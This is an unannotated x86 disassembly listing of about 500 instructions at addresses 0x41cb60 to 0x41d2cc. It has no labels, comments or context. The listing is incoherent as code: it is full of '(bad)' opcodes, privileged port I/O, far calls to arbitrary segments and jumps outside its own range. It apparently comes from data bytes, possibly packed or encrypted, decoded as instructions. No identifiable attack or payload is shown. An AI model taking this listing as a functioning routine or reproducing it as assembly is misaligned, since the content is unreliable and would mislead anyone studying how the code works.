  41cb60:	sbb    DWORD PTR ds:0xbdd16e51,edi
  41cb66:	jmp    0x41cb3e
  41cb68:	mov    edx,0x36ddbbcf
  41cb6d:	push   ebx
  41cb6e:	rcr    esp,cl
  41cb70:	jae    0x41cb36
  41cb72:	pop    esp
  41cb73:	or     edi,ebp
  41cb75:	cmp    eax,0x4f4458dc
  41cb7a:	jecxz  0x41cbc2
  41cb7c:	add    edx,ebx
  41cb7e:	loop   0x41cbfc
  41cb80:	out    dx,al
  41cb81:	mov    edx,0xad4480de
  41cb86:	jb     0x41cb73
  41cb88:	adc    BYTE PTR ds:0xeda2b9c2,al
  41cb8e:	jge    0x41cba1
  41cb90:	imul   edi,DWORD PTR [edx],0x0
  41cb93:	(bad)  
  41cb94:	pop    edi
  41cb95:	das    
  41cb96:	mov    edx,0x46d49651
  41cb9b:	xchg   edx,eax
  41cb9c:	mov    edi,DWORD PTR [eax]
  41cb9e:	pop    edi
  41cb9f:	dec    edx
  41cba0:	jmp    0xd7f93763
  41cba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cba6:	dec    ebx
  41cba8:	adc    BYTE PTR [eax-0x7b],bh
  41cbab:	pop    es
  41cbac:	sahf   
  41cbad:	call   0x6e4a:0x342776a0
  41cbb4:	mov    ch,0x86
  41cbb6:	push   eax
  41cbb7:	xchg   edx,eax
  41cbb8:	ins    BYTE PTR es:[edi],dx
  41cbb9:	inc    esp
  41cbba:	mov    eax,DWORD PTR ds:0xa4f867
  41cbc0:	mov    ch,0x6a
  41cbc2:	ins    BYTE PTR es:[edi],dx
  41cbc3:	pushf  
  41cbc4:	sbb    esp,DWORD PTR [eax]
  41cbc6:	aam    0xf1
  41cbc8:	push   ebp
  41cbc9:	adc    ebx,DWORD PTR [esi-0x4d]
  41cbcc:	jae    0x41cb5b
  41cbce:	push   ecx
  41cbcf:	sub    DWORD PTR [ecx+ecx*4],edi
  41cbd2:	or     al,0xab
  41cbd4:	imul   di,cx,0xffa7
  41cbd8:	arpl   bp,bp
  41cbda:	jl     0x41cbc5
  41cbdc:	gs mov dh,0x1e
  41cbdf:	pop    ebx
  41cbe0:	xchg   di,ax
  41cbe2:	jnp    0x41cbec
  41cbe4:	aam    0xa9
  41cbe6:	push   edi
  41cbe7:	popf   
  41cbe8:	out    0x7f,eax
  41cbea:	jmp    0xfa7d:0x3915222c
  41cbf1:	sahf   
  41cbf2:	push   esp
  41cbf3:	loopne 0x41cb7d
  41cbf5:	xor    al,0x64
  41cbf7:	and    al,0x3e
  41cbf9:	xchg   ecx,eax
  41cbfa:	dec    ebp
  41cbfb:	scas   al,BYTE PTR es:[edi]
  41cbfc:	lock outs dx,BYTE PTR ds:[esi]
  41cbfe:	iret   
  41cbff:	loope  0x41cbf6
  41cc01:	es xchg ecx,eax
  41cc03:	and    edi,DWORD PTR [eax+0x42eb6cc7]
  41cc09:	add    al,0x3c
  41cc0b:	xchg   esp,eax
  41cc0c:	cli    
  41cc0d:	add    edi,edi
  41cc0f:	shr    DWORD PTR [edi],1
  41cc11:	xchg   ecx,eax
  41cc12:	adc    al,0xff
  41cc14:	inc    ebp
  41cc15:	jle    0x41cc50
  41cc17:	add    eax,0xf6a850ae
  41cc1c:	shl    BYTE PTR [edx+edx*4],1
  41cc1f:	sbb    BYTE PTR [esi],bl
  41cc21:	push   ebx
  41cc22:	sub    DWORD PTR ds:0x5834f7e9,eax
  41cc28:	pop    eax
  41cc29:	out    0x5a,eax
  41cc2b:	xor    BYTE PTR [eax+0x22c52691],al
  41cc31:	idiv   DWORD PTR [eax]
  41cc33:	jne    0x41cbc7
  41cc35:	idiv   BYTE PTR [ecx+0xb13a4ff]
  41cc3b:	in     al,0xbd
  41cc3d:	mov    BYTE PTR [ebx+edx*4],cl
  41cc40:	adc    dh,dl
  41cc42:	xor    eax,0xc8c79645
  41cc47:	ret    
  41cc48:	inc    esp
  41cc49:	dec    edx
  41cc4a:	xchg   BYTE PTR [edi+0xe4e38e0],ch
  41cc50:	push   cs
  41cc51:	iret   
  41cc52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc53:	inc    edi
  41cc54:	mov    dl,0x65
  41cc56:	mov    ah,BYTE PTR [ecx-0x381b6f04]
  41cc5c:	imul   edi,DWORD PTR [eax],0xda67e84f
  41cc62:	aas    
  41cc63:	hlt    
  41cc64:	xor    DWORD PTR [edx],0x31
  41cc67:	enter  0x5c01,0xdd
  41cc6b:	xchg   edx,eax
  41cc6c:	xchg   DWORD PTR [eax+0x4f],edi
  41cc6f:	cmp    al,0x82
  41cc71:	jnp    0x41cc45
  41cc73:	cwde   
  41cc74:	vaddps xmm5,xmm2,xmm1
  41cc78:	pop    eax
  41cc79:	aaa    
  41cc7a:	dec    esi
  41cc7b:	(bad)  
  41cc7d:	push   ebp
  41cc7e:	cmp    eax,0xdb2f2d51
  41cc83:	pop    edx
  41cc84:	shl    DWORD PTR [ecx+0x38],0x41
  41cc88:	mov    dl,0x64
  41cc8a:	dec    esp
  41cc8b:	pop    eax
  41cc8c:	dec    esp
  41cc8d:	sahf   
  41cc8e:	adc    al,0xe4
  41cc90:	jo     0x41cc42
  41cc92:	lock lds ecx,FWORD PTR [esi]
  41cc95:	leave  
  41cc96:	xchg   BYTE PTR [ecx-0x35],ah
  41cc99:	mov    bl,0x45
  41cc9b:	stos   DWORD PTR es:[edi],eax
  41cc9c:	out    0x10,al
  41cc9e:	jp     0x41ccbb
  41cca0:	std    
  41cca1:	inc    esi
  41cca2:	lods   al,BYTE PTR ds:[esi]
  41cca3:	lahf   
  41cca4:	out    dx,al
  41cca5:	fist   WORD PTR [eax+0x4e]
  41cca8:	mov    bl,0xba
  41ccaa:	inc    esi
  41ccab:	mov    esp,0x33488bdb
  41ccb0:	adc    ebx,esp
  41ccb2:	adc    dh,BYTE PTR [edi+ebx*2+0x6cf95006]
  41ccb9:	inc    edi
  41ccba:	rcl    BYTE PTR [edi+0x47],1
  41ccbd:	sbb    bl,cl
  41ccbf:	and    al,0xb5
  41ccc1:	popa   
  41ccc2:	cli    
  41ccc3:	or     eax,0xf3360f77
  41ccc8:	mov    esi,0xf2af2c98
  41cccd:	or     BYTE PTR ds:0x3098b485,cl
  41ccd3:	cmc    
  41ccd4:	sub    edx,DWORD PTR [esi+0x1db52e23]
  41ccda:	adc    BYTE PTR [ebx+0x62],dh
  41ccdd:	cmp    esi,DWORD PTR [ebx]
  41ccdf:	into   
  41cce0:	pop    es
  41cce1:	inc    ebx
  41cce2:	sar    DWORD PTR [ebx*1+0x312e74f2],1
  41cce9:	xchg   esi,eax
  41ccea:	jne    0x41cd16
  41ccec:	popf   
  41cced:	clc    
  41ccee:	ret    
  41ccef:	sbb    DWORD PTR [ebp-0x6d],esi
  41ccf2:	lods   al,BYTE PTR ds:[esi]
  41ccf3:	jle    0x41cd00
  41ccf5:	xor    eax,0xf0d45de1
  41ccfa:	icebp  
  41ccfb:	xchg   ebx,eax
  41ccfc:	add    DWORD PTR [ebx],0xcaaf65b2
  41cd02:	iret   
  41cd03:	and    ch,BYTE PTR [edx+0x4c33e88]
  41cd09:	(bad)  
  41cd0a:	mov    ch,0x22
  41cd0c:	test   BYTE PTR [ebx],0xbe
  41cd0f:	push   ds
  41cd10:	idiv   esp
  41cd12:	sahf   
  41cd13:	jmp    0xbbe3b965
  41cd18:	repz fdiv st(3),st
  41cd1b:	out    dx,al
  41cd1c:	inc    ebp
  41cd1d:	hlt    
  41cd1e:	les    esp,FWORD PTR [edx+0x4a9d802d]
  41cd24:	push   edi
  41cd25:	or     al,BYTE PTR [ebp+ebx*4+0x61]
  41cd29:	mov    esi,ecx
  41cd2b:	ret    0x43d7
  41cd2e:	xor    BYTE PTR [edx+0x4],bl
  41cd31:	mov    dl,0x39
  41cd33:	sbb    esi,DWORD PTR [edi-0x7506702f]
  41cd39:	test   eax,0xeffa2bc
  41cd3e:	fidivr DWORD PTR [ecx-0x491da8c6]
  41cd44:	mov    cl,0x6
  41cd46:	lods   eax,DWORD PTR ds:[esi]
  41cd47:	mov    ds:0xe104e56c,eax
  41cd4c:	outs   dx,BYTE PTR ds:[esi]
  41cd4d:	xchg   ebp,eax
  41cd4e:	inc    si
  41cd50:	fidivr DWORD PTR [ecx+edi*4]
  41cd53:	clc    
  41cd54:	dec    esp
  41cd55:	scas   al,BYTE PTR es:[edi]
  41cd56:	sahf   
  41cd57:	and    eax,0xc35dec21
  41cd5c:	pop    ss
  41cd5d:	jecxz  0x41cdb5
  41cd5f:	sub    al,0x7a
  41cd61:	mov    BYTE PTR [ebp+0x7bbca353],bh
  41cd67:	add    esi,ebx
  41cd69:	and    DWORD PTR [ebx-0x7a],0xfeaeef3f
  41cd70:	scas   eax,DWORD PTR es:[edi]
  41cd71:	sub    ch,BYTE PTR [esi-0x27]
  41cd74:	hlt    
  41cd75:	or     al,0xd1
  41cd77:	mov    al,ds:0x6a7c9f84
  41cd7c:	test   eax,0x2047e414
  41cd81:	inc    edi
  41cd82:	jmp    0x41cd82
  41cd84:	adc    ah,BYTE PTR [ebp+0x2e]
  41cd87:	lea    esi,[esi]
  41cd89:	je     0x41cd8a
  41cd8b:	dec    esi
  41cd8c:	popa   
  41cd8d:	fstp   QWORD PTR [ecx+0x6f883d5]
  41cd93:	ror    DWORD PTR fs:[edx+0x7d],0xd9
  41cd98:	loope  0x41cdbb
  41cd9a:	mov    bh,0xef
  41cd9c:	dec    ebx
  41cd9d:	call   0x57d0:0x7477f00
  41cda4:	aad    0x13
  41cda6:	pop    ebx
  41cda7:	rol    DWORD PTR ds:0x7468cc31,0xde
  41cdae:	outs   dx,DWORD PTR ds:[esi]
  41cdaf:	loop   0x41cdf0
  41cdb1:	repnz push 0x124cbc8d
  41cdb7:	xchg   ebp,ebp
  41cdb9:	aas    
  41cdba:	mov    ecx,0x726bbc5d
  41cdbf:	pop    eax
  41cdc0:	rcr    BYTE PTR [esi+0x6c],0xfb
  41cdc4:	cmp    BYTE PTR [esi],dh
  41cdc6:	push   es
  41cdc7:	out    dx,eax
  41cdc8:	fist   WORD PTR [edx+0x69424005]
  41cdce:	jp     0x41ce0b
  41cdd0:	sub    cl,0x2
  41cdd3:	add    esi,esi
  41cdd5:	les    ebp,FWORD PTR [edi]
  41cdd7:	pop    es
  41cdd8:	xor    eax,DWORD PTR [ebp-0x530564a5]
  41cdde:	stos   BYTE PTR es:[edi],al
  41cddf:	aad    0x6d
  41cde1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cde2:	adc    al,0x41
  41cde4:	(bad)  
  41cde5:	ds in  al,dx
  41cde7:	(bad)  
  41cde8:	jns    0x41cdf2
  41cdea:	pop    eax
  41cdeb:	add    al,0xb
  41cded:	int    0x41
  41cdef:	daa    
  41cdf0:	fldenv [esp+edi*4+0x5d]
  41cdf4:	aam    0xf7
  41cdf6:	inc    edx
  41cdf7:	sub    al,0x37
  41cdf9:	adc    cl,BYTE PTR [esi-0x2f18df09]
  41cdff:	fcmovnb st,st(3)
  41ce01:	out    dx,eax
  41ce02:	mov    edi,0x70f91e3c
  41ce07:	or     BYTE PTR [ecx+0x30],ah
  41ce0a:	cmp    eax,0x409f7b9a
  41ce0f:	or     eax,0x58f6b528
  41ce14:	test   eax,0xc0c105e
  41ce19:	jnp    0x41ce1e
  41ce1b:	(bad)  
  41ce1c:	clc    
  41ce1d:	(bad)  [edx+0x70f9a46b]
  41ce23:	aam    0x24
  41ce25:	inc    eax
  41ce26:	rol    DWORD PTR [eax],cl
  41ce28:	push   eax
  41ce29:	test   al,0x4d
  41ce2b:	adc    BYTE PTR [edi-0x67fb8892],cl
  41ce31:	lahf   
  41ce32:	scas   al,BYTE PTR es:[edi]
  41ce33:	out    0xc2,al
  41ce35:	or     ebp,DWORD PTR [ecx]
  41ce37:	out    0xe6,eax
  41ce39:	call   DWORD PTR [edi-0xd3bfab9]
  41ce3f:	push   edi
  41ce40:	adc    al,0x60
  41ce42:	ins    BYTE PTR es:[edi],dx
  41ce43:	pop    edx
  41ce44:	(bad)
  41ce48:	stc    
  41ce49:	cdq    
  41ce4a:	xor    ebp,DWORD PTR [ecx+ecx*4]
  41ce4d:	stc    
  41ce4e:	popf   
  41ce4f:	mov    al,ds:0x85ad67b9
  41ce54:	xor    DWORD PTR [edx+0x3153c3f9],edx
  41ce5a:	or     dh,BYTE PTR [ebx]
  41ce5c:	in     eax,0x58
  41ce5e:	and    edi,DWORD PTR [ebx+0x6c91ad7e]
  41ce64:	test   al,0xa1
  41ce66:	sbb    BYTE PTR [edx+0x7e],ch
  41ce69:	loop   0x41ce86
  41ce6b:	and    edx,DWORD PTR [ecx]
  41ce6d:	sbb    eax,0x5c282428
  41ce72:	xor    DWORD PTR [ecx-0x5e],eax
  41ce75:	data16 adc BYTE PTR [ebx-0x67],ah
  41ce79:	test   BYTE PTR [ebp+0x54],dh
  41ce7c:	and    al,0xd4
  41ce7e:	mov    DWORD PTR es:[edx-0x7277ee38],edx
  41ce85:	or     al,0x18
  41ce87:	(bad)  [edx]
  41ce89:	and    ah,cl
  41ce8b:	sbb    al,0x8a
  41ce8d:	dec    ebx
  41ce8e:	sbb    edi,DWORD PTR ds:0x60f5ddca
  41ce94:	adc    eax,0x78af485
  41ce99:	xor    dl,ah
  41ce9b:	inc    eax
  41ce9c:	sahf   
  41ce9d:	push   cs
  41ce9e:	enter  0x3901,0x7
  41cea2:	daa    
  41cea3:	mov    al,ds:0x7de9a63d
  41cea8:	int    0x61
  41ceaa:	jno    0x41ce97
  41ceac:	in     eax,dx
  41cead:	test   eax,0x3492ddff
  41ceb2:	xchg   ebx,eax
  41ceb3:	test   eax,0x56f220f0
  41ceb8:	cmp    eax,0xe13b590
  41cebd:	push   esi
  41cebe:	xchg   DWORD PTR [edi-0x3d],ebx
  41cec1:	popf   
  41cec2:	dec    ebx
  41cec3:	mov    al,ds:0x64be45d
  41cec8:	sbb    al,0x57
  41ceca:	mov    ch,0x35
  41cecc:	int    0xb7
  41cece:	pop    ebx
  41cecf:	in     eax,0x93
  41ced1:	arpl   WORD PTR [esi-0xb35800b],ax
  41ced7:	(bad)  [esi]
  41ced9:	cmp    esp,ebx
  41cedb:	mov    ebp,0x564c1afb
  41cee0:	bound  esi,QWORD PTR [edi-0x69a3745c]
  41cee6:	retf   0xf971
  41cee9:	mov    eax,ds:0x7e8d4dc8
  41ceee:	ins    DWORD PTR es:[edi],dx
  41ceef:	fucom  st(7)
  41cef1:	cmp    eax,0xc539418f
  41cef6:	data16 (bad) 
  41cef8:	lods   al,BYTE PTR ds:[esi]
  41cef9:	mov    di,0x75ed
  41cefd:	cmp    BYTE PTR [edi-0x67],dh
  41cf00:	sub    BYTE PTR ds:0x3b863109,ch
  41cf06:	push   ebp
  41cf07:	sbb    al,0x93
  41cf09:	pop    ebx
  41cf0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf0b:	push   ss
  41cf0c:	loope  0x41cf52
  41cf0e:	jmp    0x34062a31
  41cf13:	pop    edi
  41cf14:	adc    eax,0x79cebc17
  41cf19:	test   BYTE PTR [edi-0x769a8f49],0xf1
  41cf20:	lock ins BYTE PTR es:[edi],dx
  41cf22:	pushf  
  41cf23:	mov    al,0x79
  41cf25:	fs pop esi
  41cf27:	call   0xe84f2c4
  41cf2c:	cmp    bh,BYTE PTR [ebp-0x54]
  41cf2f:	call   0xf22b1786
  41cf34:	push   ecx
  41cf35:	ins    DWORD PTR es:[edi],dx
  41cf36:	cli    
  41cf37:	jle    0x41cf18
  41cf39:	push   eax
  41cf3a:	mov    bl,0x78
  41cf3c:	pusha  
  41cf3d:	dec    ebx
  41cf3e:	inc    esi
  41cf3f:	jbe    0x41cede
  41cf41:	adc    dl,BYTE PTR ds:[ecx-0x533b109c]
  41cf48:	addr16 dec ebp
  41cf4a:	test   DWORD PTR [esi],ecx
  41cf4c:	add    BYTE PTR [edi+0x72],dl
  41cf4f:	ret    
  41cf50:	idiv   DWORD PTR [ecx-0x26]
  41cf53:	lock sbb esi,edx
  41cf56:	adc    BYTE PTR [ebx],bh
  41cf58:	cli    
  41cf59:	and    al,0xc0
  41cf5b:	sti    
  41cf5c:	iret   
  41cf5d:	pop    edi
  41cf5e:	mov    dh,0x52
  41cf60:	ds adc ebp,edx
  41cf63:	sti    
  41cf64:	ficom  WORD PTR [eax-0x375c4579]
  41cf6a:	adc    DWORD PTR [ecx+0xa],edi
  41cf6d:	jb     0x41cf0b
  41cf6f:	inc    ebp
  41cf70:	stos   DWORD PTR es:[edi],eax
  41cf71:	xor    bl,dl
  41cf73:	out    dx,eax
  41cf74:	div    cl
  41cf76:	xchg   esi,eax
  41cf77:	(bad)  
  41cf78:	dec    edi
  41cf79:	dec    edx
  41cf7a:	js     0x41cf88
  41cf7c:	pusha  
  41cf7d:	pop    ss
  41cf7e:	fwait
  41cf7f:	mov    esi,0x21348cc2
  41cf84:	ss dec edi
  41cf86:	das    
  41cf87:	mov    edi,DWORD PTR [ecx-0x21ae948b]
  41cf8d:	cmovp  esi,DWORD PTR [eax-0x995243]
  41cf94:	cmp    dh,BYTE PTR [ebp-0x40eb0d43]
  41cf9a:	push   ebp
  41cf9b:	cld    
  41cf9c:	push   0x47a79fa3
  41cfa1:	sub    cl,0x28
  41cfa4:	cmp    BYTE PTR [ebp+ebp*1-0x714fd5e5],0x4e
  41cfac:	adc    al,0xba
  41cfae:	cmp    ebp,DWORD PTR [edi-0x3a]
  41cfb1:	sub    BYTE PTR [edx],ah
  41cfb3:	cmp    eax,ecx
  41cfb5:	mov    cl,0x7b
  41cfb7:	lods   eax,DWORD PTR ds:[esi]
  41cfb8:	pop    es
  41cfb9:	mov    edi,0xec54679f
  41cfbe:	stos   DWORD PTR es:[edi],eax
  41cfbf:	repz call 0xe537:0x938b2810
  41cfc7:	retf   0x1a8
  41cfca:	or     esi,esi
  41cfcc:	sub    esp,DWORD PTR gs:[ebx]
  41cfcf:	fld    QWORD PTR [ebx+0x61]
  41cfd2:	or     bh,BYTE PTR [eax-0x76fe8987]
  41cfd8:	xlat   BYTE PTR ds:[ebx]
  41cfd9:	and    eax,0x622c6792
  41cfde:	hlt    
  41cfdf:	out    0xc1,al
  41cfe1:	push   ss
  41cfe2:	into   
  41cfe3:	jecxz  0x41cffc
  41cfe5:	jmp    0x41d03c
  41cfe7:	adc    esi,eax
  41cfe9:	mov    ecx,0xa0a74b8a
  41cfee:	(bad)  
  41cfef:	jns    0x41cfd8
  41cff1:	ins    BYTE PTR es:[edi],dx
  41cff2:	lods   eax,DWORD PTR ds:[esi]
  41cff3:	loop   0x41cf75
  41cff5:	mov    dl,0x91
  41cff7:	pop    ds
  41cff8:	lods   al,BYTE PTR ds:[esi]
  41cff9:	lds    esi,FWORD PTR [esp+ecx*1+0x42]
  41cffd:	sbb    ch,BYTE PTR [esi+eiz*4-0x173b2020]
  41d004:	xor    DWORD PTR [edi],edx
  41d006:	push   eax
  41d007:	inc    eax
  41d008:	mov    BYTE PTR [ecx+ecx*8-0x37],bl
  41d00c:	push   ebx
  41d00d:	out    dx,al
  41d00e:	(bad)  [ecx+edi*1]
  41d011:	je     0x41cfea
  41d013:	push   0x1f
  41d015:	and    eax,0xa3217276
  41d01a:	jb     0x41d013
  41d01c:	xchg   BYTE PTR [esi],al
  41d01e:	adc    al,0x64
  41d020:	or     BYTE PTR [eax-0x53c4e2c2],0x8c
  41d027:	test   dl,al
  41d029:	inc    esi
  41d02a:	mov    ebx,0x2af88a4
  41d02f:	shl    BYTE PTR [ebp+0x657b801],1
  41d035:	(bad)  
  41d036:	xchg   edx,eax
  41d037:	jge    0x41d02f
  41d039:	ss sub eax,0x91069adf
  41d03f:	daa    
  41d040:	add    al,0x8e
  41d042:	xchg   ecx,eax
  41d043:	(bad)
  41d047:	js     0x41d035
  41d049:	pop    esi
  41d04a:	imul   edi,DWORD PTR [esi+edi*4],0x62b62dc7
  41d051:	cmp    al,0xbd
  41d053:	xchg   ecx,eax
  41d054:	or     al,0x42
  41d056:	loopne 0x41d044
  41d058:	ss xor dl,dh
  41d05b:	xchg   esp,eax
  41d05c:	mov    ebx,0x7dcc0b16
  41d061:	jo     0x41d0b1
  41d063:	jp     0x41d07c
  41d065:	mov    bh,0x44
  41d067:	mov    esi,0x65a4ddd3
  41d06c:	fstp   TBYTE PTR [edx-0x2b]
  41d06f:	pop    ds
  41d070:	lea    ecx,[esi-0x29]
  41d073:	sub    esp,DWORD PTR [edx+edi*1]
  41d076:	das    
  41d077:	sbb    eax,0x33ee55a
  41d07c:	je     0x41d0b2
  41d07e:	mov    dh,0x9e
  41d080:	in     eax,dx
  41d081:	or     al,0xa
  41d083:	jg     0x41d026
  41d085:	out    dx,al
  41d086:	mov    BYTE PTR [esi],dh
  41d088:	mov    BYTE PTR ds:0x2bed9af6,cl
  41d08e:	push   ss
  41d08f:	inc    ebp
  41d090:	test   BYTE PTR [eax+0x26],cl
  41d093:	mov    bl,BYTE PTR [ecx-0x7167b67a]
  41d099:	adc    BYTE PTR ds:0x4fb2a15,dh
  41d09f:	stos   BYTE PTR es:[edi],al
  41d0a0:	adc    ah,BYTE PTR [ebx+ebp*1]
  41d0a3:	enter  0xdb61,0x51
  41d0a7:	pop    ss
  41d0a8:	gs stc 
  41d0aa:	mov    cl,BYTE PTR fs:[edx]
  41d0ad:	mov    WORD PTR [ecx+edx*4+0x2f],?
  41d0b1:	add    esp,ecx
  41d0b3:	(bad)  
  41d0b4:	ins    BYTE PTR es:[edi],dx
  41d0b5:	mov    ds:0x5909497e,eax
  41d0ba:	pop    ds
  41d0bb:	cmp    eax,0x4ba66735
  41d0c0:	push   ebx
  41d0c1:	test   al,0xc4
  41d0c3:	lock mov al,ds:0x6cf36bec
  41d0c9:	ret    0xb1e4
  41d0cc:	sbb    dl,dh
  41d0ce:	dec    edi
  41d0cf:	in     eax,dx
  41d0d0:	sub    DWORD PTR [esi+0x7e],esi
  41d0d3:	xrelease xchg DWORD PTR es:[edx+0x74],ebp
  41d0d8:	fist   WORD PTR [edi-0x261a2a72]
  41d0de:	test   DWORD PTR [edx+0x51],ecx
  41d0e1:	fld    DWORD PTR [eax-0x729f3fce]
  41d0e7:	fnstenv [eax]
  41d0e9:	cld    
  41d0ea:	cmp    al,0x48
  41d0ec:	adc    al,0xa7
  41d0ee:	ds icebp 
  41d0f0:	pop    ss
  41d0f1:	dec    edx
  41d0f2:	(bad)  
  41d0f3:	pop    edi
  41d0f4:	mov    cs,WORD PTR gs:[ebx-0x53a69301]
  41d0fb:	aas    
  41d0fc:	adc    DWORD PTR [ebp+0x6ba7c32f],edx
  41d102:	fistp  DWORD PTR [ecx]
  41d104:	sbb    edi,ebp
  41d106:	mov    ds:0xa2d368d8,al
  41d10b:	mov    ds:0x15a47275,eax
  41d110:	and    eax,0xaf10e000
  41d115:	sub    ebx,DWORD PTR [ebx+eiz*2+0x6f]
  41d119:	popa   
  41d11a:	scas   al,BYTE PTR es:[edi]
  41d11b:	adc    al,0x19
  41d11d:	push   0xffffff9f
  41d11f:	call   DWORD PTR [edx+0x65]
  41d122:	adc    eax,0xf6bfc632
  41d127:	aas    
  41d128:	or     BYTE PTR [edx],bh
  41d12a:	stos   DWORD PTR es:[edi],eax
  41d12b:	or     eax,0xbf6d5de8
  41d130:	ret    
  41d131:	pop    eax
  41d132:	cli    
  41d133:	mov    dl,0xc8
  41d135:	(bad)  
  41d136:	or     eax,0x9d6a8261
  41d13b:	inc    ebp
  41d13c:	mov    bh,0xd6
  41d13e:	or     DWORD PTR [ebx+0x6c5c0444],ecx
  41d144:	mov    ds:0x33d3391a,eax
  41d149:	jecxz  0x41d14a
  41d14b:	pop    es
  41d14c:	test   BYTE PTR [edx-0x2e],bl
  41d14f:	neg    DWORD PTR [eax+0x7]
  41d152:	and    eax,0xf6360cb
  41d157:	cli    
  41d158:	stos   DWORD PTR es:[edi],eax
  41d159:	aam    0x1a
  41d15b:	in     al,0x7d
  41d15d:	mov    dl,0x1e
  41d15f:	stos   DWORD PTR es:[edi],eax
  41d160:	jecxz  0x41d10b
  41d162:	pop    ebp
  41d163:	cmp    eax,DWORD PTR cs:[bp-0xdb2]
  41d169:	and    al,0x90
  41d16b:	(bad)  
  41d16d:	mov    al,0x86
  41d16f:	in     al,dx
  41d170:	retf   0x4329
  41d173:	in     al,dx
  41d174:	popa   
  41d175:	rcl    DWORD PTR [ebx],0x2e
  41d178:	addr16 sbb eax,0x2aff2a5
  41d17e:	xchg   edi,eax
  41d17f:	aam    0xea
  41d181:	sbb    esp,DWORD PTR [ebx-0x7fcaf9db]
  41d187:	or     al,0xe0
  41d189:	test   DWORD PTR [ebp-0xfc54d17],ebx
  41d18f:	adc    DWORD PTR [ebx+0x12],ebx
  41d192:	hlt    
  41d193:	xchg   edx,eax
  41d194:	xchg   ecx,ebx
  41d196:	adc    al,dh
  41d198:	mov    bh,0x44
  41d19a:	mov    es,WORD PTR [edx+0x5b5057cf]
  41d1a0:	and    eax,0xd1866a48
  41d1a5:	jb     0x41d1e1
  41d1a7:	ins    DWORD PTR es:[edi],dx
  41d1a8:	call   0x2a2e:0x2b33aa4b
  41d1af:	sbb    al,0x27
  41d1b1:	fadd   QWORD PTR [edi+eiz*2-0x49]
  41d1b5:	push   eax
  41d1b6:	pop    ebx
  41d1b7:	sub    al,0x5b
  41d1b9:	(bad)  
  41d1ba:	cmp    al,0x16
  41d1bc:	int3   
  41d1bd:	mov    eax,0x1da73245
  41d1c2:	call   0xaec:0x5e53a566
  41d1c9:	fisub  WORD PTR [edi]
  41d1cb:	xor    ebx,DWORD PTR [eax]
  41d1cd:	xlat   BYTE PTR ds:[ebx]
  41d1ce:	adc    ebx,edi
  41d1d0:	add    al,0xd
  41d1d2:	jge    0x41d159
  41d1d4:	mov    al,0x83
  41d1d6:	xchg   esp,eax
  41d1d7:	lea    esi,[eax+0x6b]
  41d1da:	push   0xffffffd6
  41d1dc:	jno    0x41d160
  41d1de:	test   ch,al
  41d1e0:	inc    eax
  41d1e1:	sub    al,0x34
  41d1e3:	xor    BYTE PTR [ecx-0x2c9fff80],ch
  41d1e9:	sub    DWORD PTR [ecx+0x9],eax
  41d1ec:	fisub  WORD PTR [edx]
  41d1ee:	pushf  
  41d1ef:	pop    edi
  41d1f0:	das    
  41d1f1:	std    
  41d1f2:	dec    ebp
  41d1f3:	rcpps  xmm6,XMMWORD PTR [edi+0x53106d3f]
  41d1fa:	jge    0x41d21e
  41d1fc:	mov    ah,0x54
  41d1fe:	pop    ebp
  41d1ff:	out    0xd,eax
  41d201:	stos   BYTE PTR es:[edi],al
  41d202:	inc    ebx
  41d203:	inc    esp
  41d204:	jae    0x41d18d
  41d206:	dec    edi
  41d207:	bound  edi,QWORD PTR [ebx+0x33]
  41d20a:	mov    ecx,0x6a2cad2f
  41d20f:	call   DWORD PTR [ebx]
  41d211:	cmp    eax,0x3551fb82
  41d216:	sbb    dh,al
  41d218:	push   cs
  41d219:	lods   al,BYTE PTR ds:[esi]
  41d21a:	(bad)  
  41d21b:	and    cl,BYTE PTR ds:[ebp+0x1]
  41d21f:	fs jmp 0x10ee4f57
  41d225:	sahf   
  41d226:	xchg   BYTE PTR [ebp+0x523c27e3],cl
  41d22c:	fidivr DWORD PTR [eax-0x3f]
  41d22f:	dec    edx
  41d230:	dec    ecx
  41d231:	mov    al,ds:0x46383e9a
  41d236:	cwde   
  41d237:	test   eax,0x5a1e44b2
  41d23c:	jns    0x41d20a
  41d23e:	push   ss
  41d23f:	push   esp
  41d240:	outs   dx,DWORD PTR ds:[esi]
  41d241:	es repz xor eax,0x9d6ceddd
  41d248:	pop    edi
  41d249:	sub    esi,0xffffff97
  41d24c:	push   ebp
  41d24d:	sbb    DWORD PTR [esi],0x5
  41d250:	lds    ebx,FWORD PTR [esi+eax*2+0x477af68f]
  41d257:	inc    ebp
  41d258:	pop    esp
  41d259:	dec    esi
  41d25a:	pop    ebp
  41d25b:	and    eax,0x8f9fe4ec
  41d260:	inc    ebp
  41d261:	test   edx,eax
  41d263:	fimul  DWORD PTR [ecx-0x22]
  41d266:	cmp    dl,ah
  41d268:	mov    WORD PTR [esi+0x25edce45],es
  41d26e:	rol    DWORD PTR [ebx-0x752b5ab3],cl
  41d274:	mov    ecx,0x91c3e4fc
  41d279:	scas   eax,DWORD PTR es:[edi]
  41d27a:	int    0x22
  41d27c:	sbb    ah,dl
  41d27e:	dec    esp
  41d27f:	sub    bl,BYTE PTR ds:0x42952b9d
  41d285:	ss add al,0x80
  41d288:	adc    al,0x4b
  41d28a:	and    bl,BYTE PTR [edi-0x53]
  41d28d:	stc    
  41d28e:	addr16 call 0xb646:0x9678c005
  41d296:	jecxz  0x41d281
  41d298:	inc    edx
  41d299:	jle    0x41d2fc
  41d29b:	neg    BYTE PTR [eax+0x52]
  41d29e:	sbb    DWORD PTR [eax+esi*8-0xc3d2c1d],ebp
  41d2a5:	ficom  WORD PTR [esi-0x6]
  41d2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a9:	xchg   ebx,eax
  41d2aa:	(bad)  [ebx+0x75]
  41d2ad:	aas    
  41d2ae:	cmp    BYTE PTR [edx],dh
  41d2b0:	xor    ch,BYTE PTR [edi+edi*2]
  41d2b3:	jbe    0x41d2f8
  41d2b5:	aas    
  41d2b6:	inc    ecx
  41d2b7:	xchg   ebp,eax
  41d2b8:	fidiv  WORD PTR [edi-0x77cf65d8]
  41d2be:	(bad)  
  41d2bf:	int    0x4a
  41d2c1:	push   0x700a23fc
  41d2c6:	add    al,0x75
  41d2c8:	inc    edx
  41d2c9:	pop    ss
  41d2ca:	jns    0x41d33c
  41d2cc:	sbb    al,0x6e
